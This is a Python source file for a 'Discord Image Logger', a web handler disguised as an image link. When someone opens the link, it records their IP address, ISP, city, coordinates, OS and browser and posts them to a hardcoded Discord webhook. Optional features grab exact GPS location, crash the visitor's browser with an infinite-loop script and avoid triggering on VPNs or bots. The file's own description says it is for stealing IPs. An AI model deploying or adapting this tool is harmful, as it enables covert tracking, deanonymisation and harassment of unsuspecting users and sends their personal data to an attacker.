# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/941079729098870794/YZfMbL6x_JMUdwbiBTBlAIcBO2xWJBr9ZGWyCx97XyW-CKRDxAmMsQrLXOAcqLglnxcx",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
